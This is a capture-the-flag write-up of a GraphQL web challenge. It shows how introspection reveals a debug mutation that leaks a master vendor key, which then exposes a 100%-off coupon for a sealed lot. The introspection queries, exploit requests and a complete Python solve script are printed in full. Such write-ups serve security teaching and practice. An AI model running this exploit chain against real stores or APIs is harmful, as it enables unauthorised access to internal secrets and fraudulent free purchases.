# Used Goods of Tomorrow - writeup (web, GraphQL)

## What the task was

Tomorrow-Mart is a marketplace for used goods. You open a FutureBank account and get 500 starter credits. The store's crown jewel is **Lot #4042 - Founders' Vault Deed (SEALED)**, priced at **1,000,000 credits**.

The storefront and all wallet actions go through a single GraphQL endpoint:

```text
POST /graphql
```

Auth is a bearer token stored client-side after registration.

Goal: buy Lot #4042. There is no way to legitimately earn 1,000,000 credits, so the answer has to be an unintended discount or a hidden privilege.

---

## First look

The app's JavaScript calls `/graphql` with queries such as:

```graphql
{ myAccount { handle balanceCredits } }
```

So the API is easy to poke directly with `curl` or any HTTP client.

The first obvious question: is schema introspection turned on? GraphQL servers often leave it enabled by accident, and it dumps the whole type system.

---

## Step 1: introspection reveals a hidden mutation

A standard introspection query lists every type and its fields:

```json
{"query":"{ __schema { types { name fields { name } } } }"}
```

The result contains a `Mutation` type with four entries:

```text
register
login
placeOrder
vendorTerminalSync
```

`placeOrder` is expected, but `vendorTerminalSync` is a hidden helpdesk-ish operation that the demo prompt never mentions.

Asking for its return fields:

```json
{"query":"{ __schema { mutationType { fields { name args { name type { kind name ofType { kind name } } } } } } }"}
```

shows it returns:

```text
terminalId
status
firmware
vendorKey
note
```

and it takes an optional `terminalId`.

---

## Step 2: the master vendor key is leaked

Calling the mutation directly:

```json
{"query":"mutation { vendorTerminalSync { terminalId status firmware vendorKey note } }"}
```

returns:

```json
{
  "vendorTerminalSync": {
    "terminalId": "TERM-00",
    "status": "ONLINE",
    "firmware": "vterm-beta-0.9.7",
    "vendorKey": "VND-MASTER-<...hex...>",
    "note": "Diagnostics nominal. Remember to disable this endpoint before public launch."
  }
}
```

The note is a direct hint: this debug endpoint should not have been shipped.

---

## Step 3: the master key unlocks internal promo codes

The schema has a query:

```graphql
promoCodes(vendorKey: String!)
```

Feeding the leaked key:

```json
{"query":"{ promoCodes(vendorKey:\"VND-MASTER-<...hex...>\") { code description percentOff appliesTo } }"}
```

returns three promo codes:

```text
SCOUT-10    10% off any listing
ATOMIC-25   25% off the Atomic Toaster (appliesTo 1001)
FOUNDERS-100  100% off Lot #4042 (appliesTo 4042)   <- gold
```

`FOUNDERS-100` is an internal / returns-100% coupon for the exact item we want.

---

## Step 4: register and place the order

Registering sets a bearer token:

```json
{"query":"mutation { register(username:\"x\", password:\"y\") { token } }"}
```

Then place the order with the promo code:

```json
{"query":"mutation { placeOrder(listingId:\"4042\", promoCode:\"FOUNDERS-100\") { success flag } }"}
```

The response includes the flag. The deal is yours for **0 credits**.

---

## What I tried first

1. **Buying it outright** - obviously out of reach (1,000,000 credits).
2. **Finding an admin route / exposed auth backdoor on the web app** - nothing there; the app is a thin GraphQL client.
3. **Brute-forcing promo codes blindly** - a waste of time. The legitimate path is the introspection + vendor key leak.

The actual bug is simply that **introspection is left on** and a **debug mutation exposes a master key**. Nothing exotic beyond that.

---

## Final `solve.py`

```python
#!/usr/bin/env python3
"""Used Goods of Tomorrow / SunshineCTF 2026 - GraphQL solve."""
import json
import requests

BASE = "<challenge-url>"           # challenge instance (closed after the event)
GRAPHQL = BASE + "/graphql"


def gql(session, query, token=None, name="q"):
    h = {"Content-Type": "application/json"}
    if token:
        h["Authorization"] = "Bearer " + token
    r = session.post(GRAPHQL, json={"query": query}, headers=h, timeout=20)
    r.raise_for_status()
    data = r.json()
    if "errors" in data:
        raise RuntimeError(name + ": " + json.dumps(data["errors"]))
    return data["data"]


def main() -> int:
    s = requests.Session()

    # 1) Leak the master vendor key from the hidden debug mutation.
    d = gql(s, 'mutation { vendorTerminalSync { vendorKey } }', name="vendorTerminalSync")
    vendor_key = d["vendorTerminalSync"]["vendorKey"]
    print("[+] vendorKey =", vendor_key)

    # 2) Use the master key to list internal promo codes.
    q = (
        '{ promoCodes(vendorKey:"%s") { code percentOff appliesTo } }'
        % vendor_key
    )
    d = gql(s, q, name="promoCodes")
    codes = {c["code"]: c for c in d["promoCodes"]}
    print("[+] promo codes:", list(codes))

    promo = "FOUNDERS-100"          # 100% off Lot #4042
    assert codes[promo]["appliesTo"] == "4042"

    # 3) Register an account.
    import secrets
    user = "buyer_" + secrets.token_hex(4)
    pw = secrets.token_urlsafe(12)
    d = gql(
        s,
        'mutation { register(username:"%s", password:"%s") { token } }' % (user, pw),
        name="register",
    )
    token = d["register"]["token"]
    print("[+] registered, token =", token[:12], "...")

    # 4) Buy the vault for free.
    d = gql(
        s,
        'mutation { placeOrder(listingId:"4042", promoCode:"%s") { success pricePaid flag } }'
        % promo,
        token=token,
        name="placeOrder",
    )
    print("[+] result:", d["placeOrder"])
    print("[+] flag:", d["placeOrder"]["flag"])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Run with:

```bash
python3 solve.py
```

---

## Result

Lot #4042 is purchased for **0 credits** and the response carries the flag.

Flag: `sun{...}` (masked)

---

## One-paragraph version

The store runs entirely through a GraphQL API with **schema introspection left enabled**. Introspection shows a hidden debug mutation, `vendorTerminalSync`, which is meant to be disabled before launch and plainly returns a **master vendor key**. That key unlocks an internal `promoCodes` query, which exposes `FOUNDERS-100` - a 100%-off coupon for Lot #4042. Registering a normal account and placing the order with that coupon buys the deed for free and returns the flag.

---

## Lessons learned

1. **Check GraphQL introspection first.** It is the fastest way to enumerate hidden queries and mutations.
2. **Read the "note" / debug text.** `vendorTerminalSync` literally says "disable this endpoint before public launch".
3. Internal promo / discount codes are an easy blind spot; a `percentOff = 100` code is an instant win.
4. The client-side UI is just a thin wrapper - talk to the API directly.